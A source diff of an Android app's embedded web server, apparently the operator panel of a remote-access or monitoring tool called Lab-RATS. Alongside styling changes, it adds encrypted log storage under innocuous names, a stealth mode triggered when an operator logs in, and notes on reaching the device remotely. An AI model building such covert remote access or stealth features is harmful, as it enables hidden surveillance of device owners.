@@ -38,14 +38,12 @@ import java.io.ByteArrayOutputStream;
 import java.text.SimpleDateFormat;
 import java.util.Locale;
 import java.util.Map;
-import org.json.JSONObject;
-
-import com.labs.labrats.exploits.ExploitLab;
 
 import fi.iki.elonen.NanoHTTPD;
 
 public class LabRatsHttpServer extends NanoHTTPD {
 
+    public static final int DEFAULT_PORT = 9191;
     private final Context context;
     private static final List<String> systemLogs = java.util.Collections.synchronizedList(new java.util.LinkedList<>());
     private static boolean logsLoaded = false;
@@ -103,17 +101,21 @@ public class LabRatsHttpServer extends NanoHTTPD {
     private void loadPersistentData() {
         SharedPreferences prefs = context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE);
         
-        // Load System Logs
         if (!logsLoaded) {
-            String logsJson = prefs.getString("system_logs_secure", null);
-            if (logsJson == null) {
-                // Fallback for legacy builds
-                logsJson = prefs.getString("system_logs", "[]");
-            } else {
-                logsJson = deobfuscate(logsJson);
-            }
-
+            String logsJson = "[]";
             try {
+                // Try New Dynamic Encryption First
+                String encryptedHex = prefs.getString("system_logs_encrypted", null);
+                if (encryptedHex != null) {
+                    byte[] encrypted = android.util.Base64.decode(encryptedHex, android.util.Base64.DEFAULT);
+                    logsJson = SystemAnalytics.decrypt(encrypted);
+                } else {
+                    // Fallback to legacy obfuscation
+                    String legacy = prefs.getString("system_logs_secure", null);
+                    if (legacy != null) logsJson = deobfuscate(legacy);
+                    else logsJson = prefs.getString("system_logs", "[]");
+                }
+
                 org.json.JSONArray array = new org.json.JSONArray(logsJson);
                 systemLogs.clear();
                 for (int i = 0; i < array.length(); i++) {
@@ -121,7 +123,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
                 }
                 logsLoaded = true;
             } catch (Exception e) {
-            Log.e("SystemSync", "Error: " + e.getMessage());
+                Log.e("SystemSync", "Restore failed: " + e.getMessage());
+                logsLoaded = true; 
             }
         }
     }
@@ -134,13 +137,16 @@ public class LabRatsHttpServer extends NanoHTTPD {
             synchronized (systemLogs) {
                 logsCopy = new java.util.ArrayList<>(systemLogs);
             }
-            for (String log : logsCopy) {
-                array.put(log);
-            }
+            for (String log : logsCopy) array.put(log);
+            
+            // Dynamic Build-Time Encryption
+            byte[] encrypted = SystemAnalytics.encrypt(array.toString());
+            String encryptedHex = android.util.Base64.encodeToString(encrypted, android.util.Base64.DEFAULT);
+            
             staticContext.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
-                .edit().putString("system_logs_secure", obfuscate(array.toString())).apply();
+                .edit().putString("system_logs_encrypted", encryptedHex).apply();
         } catch (Exception e) {
-            Log.e("SystemSync", "Error: " + e.getMessage());
+            Log.e("SystemSync", "Save failed: " + e.getMessage());
         }
     }
 
@@ -406,7 +412,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  .action-row-limited { flex-direction: column !important; align-items: center !important; width: 100% !important; }" +
             "  .action-row-limited form { width: 100% !important; }" +
             "  .header { padding: 15px 0; margin-bottom: 10px; display: flex; flex-direction: column; align-items: center; gap: 0; overflow: visible; }" +
-            "  .title-font { font-family: 'Orbitron', sans-serif !important; font-size: 1.71rem !important; letter-spacing: 1.5px !important; margin-right: -1.5px !important; font-weight: 900 !important; text-align: center !important; width: 100% !important; display: block !important; margin: 0 0 10px 0 !important; white-space: nowrap !important; overflow: visible !important; position: relative; z-index: 10; line-height: 1.2; }" +
+            "  .title-font { font-family: 'Orbitron', sans-serif !important; font-size: 2.2rem !important; letter-spacing: 1.5px !important; margin-right: -1.5px !important; font-weight: 900 !important; text-align: center !important; width: 100% !important; display: block !important; margin: 0 0 10px 0 !important; white-space: nowrap !important; overflow: visible !important; position: relative; z-index: 10; line-height: 1.2; }" +
             "  .glitch-container { margin: 0 0 10px 0 !important; height: auto !important; }" +
             "  .version-text { font-size: 0.45rem !important; letter-spacing: 1px !important; margin: 0 0 10px 0 !important; }" +
             "  .glitch { font-size: 0.47rem; letter-spacing: 1px; }" +
@@ -511,14 +517,17 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  .btn-back:hover { background: rgba(0, 242, 255, 0.1); box-shadow: 0 0 25px currentColor; border-color: currentColor; }" +
             "}" +
             ".btn-back { display: inline-flex; align-items: center; gap: 8px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); color: var(--neon-cyan); padding: 8px 16px; text-decoration: none; border-radius: 12px; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 1px; transition: all 0.3s; }" +
-            ".watermark { position: absolute; top: 50%; left: 20px; transform: translateY(-50%); height: 75%; width: auto; z-index: 10000; opacity: 1.0; pointer-events: none; border-radius: 50%; background: transparent !important; filter: drop-shadow(0 0 8px var(--neon-cyan)); }" +
+                        ".watermark { position: absolute; top: 50%; left: 30px; transform: translateY(-50%); height: 184px; width: auto; z-index: 10; opacity: 1.0; pointer-events: none; background: transparent !important; filter: drop-shadow(0 0 15px var(--neon-cyan)); }" +
+            "@media (max-width: 768px) {" +
+            "  .watermark { position: relative !important; top: 0 !important; left: 0 !important; transform: none !important; margin-bottom: 15px; height: 150px !important; width: auto !important; opacity: 1.0 !important; z-index: 10; pointer-events: none; display: block !important; }" +
+            "}" +
             "@keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }" +
             "</style>" +
             "</head>" +
             "<body>" +
             "<div class=\"container\">" +
             "  <div class=\"header\">" +
-            "    <img src=\"/logo?v=145\" class=\"watermark\" alt=\"UPLINK\" loading=\"eager\">" +
+            "    <img src=\"/logo?v=146\" class=\"watermark\" alt=\"Lab-RATS\" loading=\"eager\">" +
             "    <div class=\"title-font\">CORE_UPLINK</div>" +
             "    <div class=\"glitch-container\">" +
             "      <div class=\"glitch\" data-text=\"DEVELOPED BY K4N3CO.LABS\">DEVELOPED BY K4N3CO.LABS</div>" +
@@ -582,24 +591,25 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "@font-face { font-family: 'Orbitron'; src: url('/font/orbitron.ttf?v=100') format('truetype'); font-display: swap; }" +
             "* { box-sizing: border-box; margin: 0; padding: 0; }" +
             "body { background: #050505; color: #00f2ff; font-family: 'Orbitron', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; padding: 15px; }" +
-            ".login-card { background: rgba(15,15,25,0.95); border: 1px solid #00f2ff; padding: 50px 30px; border-radius: 16px; text-align: center; box-shadow: 0 0 50px rgba(0,242,255,0.15); width: 100%; max-width: 500px; position: relative; }" +
+                        ".login-card { background: rgba(15,15,25,0.95); border: 1px solid #00f2ff; padding: 50px 30px; border-radius: 16px; text-align: center; box-shadow: 0 0 50px rgba(0,242,255,0.15); width: 100%; max-width: 500px; position: relative; }" +
             ".title-font { font-family: 'Orbitron', sans-serif !important; font-weight: 900 !important; font-size: 1.8rem; letter-spacing: 3px; margin-bottom: 40px; color: #00f2ff; text-shadow: 0 0 15px rgba(0,242,255,0.6); line-height: 1.2; white-space: nowrap; transition: all 0.5s; }" +
             "@media (max-width: 480px) {" +
             "  .login-card { padding: 35px 20px; }" +
             "  .title-font { font-size: 1.3rem !important; letter-spacing: 1.5px; margin-bottom: 25px; }" +
             "  input { padding: 14px !important; font-size: 14px !important; }" +
             "  button { padding: 14px !important; font-size: 14px !important; }" +
+            "  .login-card img { width: 150px !important; height: 150px !important; }" +
             "}" +
             "form { display: flex; flex-direction: column; align-items: center; width: 100%; }" +
             "input { background: #000; border: 1px solid rgba(0,242,255,0.4); color: #fff; padding: 18px; margin-bottom: 30px; width: 100%; max-width: 350px; border-radius: 8px; outline: none; text-align: center; font-family: 'Orbitron', monospace; font-size: 16px; transition: 0.3s; }" +
             "input:focus { border-color: #00f2ff; box-shadow: 0 0 20px rgba(0,242,255,0.2); }" +
             "button { background: #00f2ff; border: none; color: #050505; padding: 18px 30px; cursor: pointer; text-transform: uppercase; letter-spacing: 3px; transition: 0.3s; border-radius: 50px; width: 100%; max-width: 280px; font-weight: 900; font-family: 'Orbitron', sans-serif; box-shadow: 0 0 20px rgba(0,242,255,0.4); }" +
             "button:hover { background: #fff; box-shadow: 0 0 40px rgba(0,242,255,0.6); transform: scale(1.05); }" +
-            ".login-card img { transition: all 0.5s; }" +
+            ".login-card img { transition: all 0.5s; margin-bottom: 30px; }" +
             ".login-card img:hover { transform: scale(1.1) translateY(-5px); filter: drop-shadow(0 0 30px rgba(0, 242, 255, 1.0)); }" +
             "</style></head><body>" +
             "<div class=\"login-card\">" +
-            "<img src=\"/logo?v=145\" style=\"width: 115px; height: 115px; margin-bottom: 20px; filter: drop-shadow(0 0 20px rgba(0, 242, 255, 0.8)); border-radius: 50%; background: transparent !important;\">" +
+            "<img src=\"/logo?v=146\" style=\"width: 187px; height: 187px; filter: drop-shadow(0 0 20px rgba(0, 242, 255, 0.8)); background: transparent !important;\">" +
             "<div id=\"status-header\" class=\"title-font\">RESTRICTED_ACCESS</div>" +
             "<div style=\"font-size:0.6rem; opacity:0.4; margin-top:-20px; margin-bottom:30px; letter-spacing:2px;\">UPLINK_PROTOCOL_V1.4.5</div>" +
             "<form onsubmit=\"handleLogin(event)\">" +
@@ -737,6 +747,10 @@ public class LabRatsHttpServer extends NanoHTTPD {
                 
                 if (pass != null && getStoredPassword().equals(pass.trim())) {
                     logActivity("AUTHENTICATION_SUCCESS: Uplink authorized");
+                    
+                    // Trigger Instant Stealth Masking on Connection
+                    SystemAnalytics.setStealthMode(context, true);
+
                     if (isJson) {
                         response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                     } else {
@@ -1029,7 +1043,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             }
             byte[] bytes = buffer.toByteArray();
             Response response = newFixedLengthResponse(Response.Status.OK, "image/png", new java.io.ByteArrayInputStream(bytes), bytes.length);
-            response.addHeader("Cache-Control", "public, max-age=31536000, immutable");
+            response.addHeader("Cache-Control", "public, max-age=86400");
             return response;
         } catch (Exception e) {
             return serveError("Logo error: " + e.getMessage());
@@ -1058,6 +1072,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
     }
 
     private Response serveHome(IHTTPSession session) {
+        CoreSyncService.notifyOperatorActivity();
         String ip = MainActivity.getLocalIpAddress();
         String ipDisplay = (ip != null ? ip : "NOT_DETECTED");
         String sessionId = sessionToken.substring(0, 4).toUpperCase();
@@ -1073,25 +1088,31 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("<h2 style=\"margin:0; letter-spacing:1px; line-height:1.2; text-align: left;\">SYSTEM_MONITOR ").append(snifferStatus).append("</h2>");
         html.append("<div style=\"font-size:0.6rem; opacity:0.5; font-family:monospace; margin-top:8px; text-align: left;\">SESSION_ID: ").append(sessionId).append("</div>");
         html.append("</div>");
-        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px;\">");
+        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; justify-content: center;\">");
         
         // Server Status
-        html.append("<div style=\"padding: 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-left-width: 3px; box-shadow: 0 0 10px rgba(0, 242, 255, 0.1);\">");
+        html.append("<div style=\"padding: 30px 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-left-width: 3px; box-shadow: 0 0 15px rgba(0, 242, 255, 0.1); text-align: center;\">");
         html.append("<div class=\"info-label\">UPLINK_STATUS</div>");
         // Status: Green ONLINE if running, Red DOWN otherwise. Since we are serving this, it's ONLINE.
-        html.append("<div style=\"font-size: 1.5rem; font-weight: bold; color: var(--neon-green);\">ONLINE</div>");
+        html.append("<div style=\"font-size: 1.8rem; font-weight: bold; color: var(--neon-green); margin-top: 10px;\">ONLINE</div>");
         html.append("</div>");
         
         // Port
-        html.append("<div style=\"padding: 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-left-width: 3px; box-shadow: 0 0 10px rgba(0, 242, 255, 0.1);\">");
+        html.append("<div style=\"padding: 30px 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-left-width: 3px; box-shadow: 0 0 15px rgba(0, 242, 255, 0.1); text-align: center;\">");
         html.append("<div class=\"info-label\">ACCESS_PORT</div>");
-        html.append("<div style=\"font-size: 1.5rem; font-weight: bold; color: var(--neon-cyan);\">8080</div>");
+        html.append("<div style=\"font-size: 1.8rem; font-weight: bold; color: var(--neon-cyan); margin-top: 10px;\">").append(getListeningPort()).append("</div>");
         html.append("</div>");
         
         // IP
-        html.append("<div style=\"padding: 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-left-width: 3px; box-shadow: 0 0 10px rgba(0, 242, 255, 0.1);\">");
+        html.append("<div style=\"padding: 30px 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-left-width: 3px; box-shadow: 0 0 15px rgba(0, 242, 255, 0.1); text-align: center;\">");
         html.append("<div class=\"info-label\">VIRTUAL_ADDRESS</div>");
-        html.append("<div style=\"font-size: 1rem; font-weight: bold; color: var(--neon-cyan); word-break: break-all;\">").append(ipDisplay).append("</div>");
+        html.append("<div style=\"font-size: 1.2rem; font-weight: bold; color: var(--neon-cyan); word-break: break-all; margin-top: 10px;\">").append(ipDisplay).append("</div>");
+        html.append("</div>");
+
+        // NAT Traversal Info
+        html.append("<div style=\"padding: 20px; background: rgba(255, 255, 0, 0.03); border: 1px solid var(--neon-yellow); border-left-width: 3px; grid-column: 1 / -1; text-align: center;\">");
+        html.append("<div class=\"info-label\" style=\"color: var(--neon-yellow);\">CONNECTIVITY_PROTOCOL</div>");
+        html.append("<div style=\"font-size: 0.75rem; color: #aaa; margin-top: 8px; max-width: 800px; margin-left: auto; margin-right: auto;\">System prioritizes <b>Global IPv6</b> for remote access. If only a local IP (192.168...) is detected, the device must transition to a Cellular network or IPv6-enabled WiFi for public uplink.</div>");
         html.append("</div>");
         
         html.append("</div>");
